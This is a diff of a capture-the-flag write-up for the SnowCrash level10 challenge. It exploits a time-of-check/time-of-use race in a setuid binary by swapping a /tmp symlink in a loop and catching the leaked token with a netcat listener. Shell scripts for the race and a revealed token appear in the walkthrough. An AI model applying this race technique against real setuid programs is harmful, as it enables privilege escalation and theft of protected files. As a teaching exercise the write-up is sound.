@@ -1,3 +1,5 @@
+# Level10
+
 ## Exploring the exercice
 
 ```bash 
@@ -7,7 +9,8 @@ $ ls -la
 ```
 
 We have a binary setuid and a token file with no rights for us. 
-Let's do some tests
+
+## Inspecting the files
 
 ```bash 
 $ ./level10 
@@ -30,7 +33,7 @@ $ ./level10 /tmp/salut.txt level10
 Connecting to level10:6969 .. Unable to connect to host level10
 ```
 
-Okay no rights issue if it is our file. Let's look at the program with strings
+Okay no rights issue if it is our file. Let's look at the program with strings.
 
 ```bash 
 $  strings ./level10 
@@ -53,8 +56,6 @@ You don't have access to %s
 ;*2$"
 ```
 
-
-
 The executable checks if we have the rights to read the file with the access function then tries to send it to a server and display its content but we do not have the necessary rights on the token file.
 
 
@@ -63,7 +64,7 @@ We learned more about 'access' and discovered the existence of  <a href='https:/
 
 ```bash 
 NOTES
-Warning:  Using  access()  to  check  if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to  manipulate  it.   For  this reason,  the use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
+Warning:  Using  access()  to  check  if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to  manipulate  it.   For  this reason,  the use of this system call should be avoided.
 ```
 
 What we want to do is that the access happens on a file where we have the rights and the open on the token.
@@ -81,7 +82,6 @@ while true; do
 done
 ```
 
-
 Now in another program we will execute level10 excutable in a loop wih our file /tmp/link as an argument hoping that when the open is called it happens on the token. 
 
 
@@ -96,7 +96,7 @@ while true; do
 done
 ```
 
-We launch both our scripts in windows and we listen to the port 6969 (like we saw with strings that is where the output of level10 will be). 
+We launch both our scripts in terminals and we listen to the port 6969 (like we saw with strings that is where the output of level10 will be). 
 
 ```bash 
 $ nc -lk 6969
@@ -112,14 +112,14 @@ woupa2yuojeeaaed06riuj63c
 ^C
 ```
 
+## Getting the flag
 
-Let's try 
 ```bash
 level10@SnowCrash:~$ su flag10
 Password:
 Don't forget to launch getflag !
 flag10@SnowCrash:~$ getflag
-Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+Check flag.Here is your token : ********
 ````
 
 
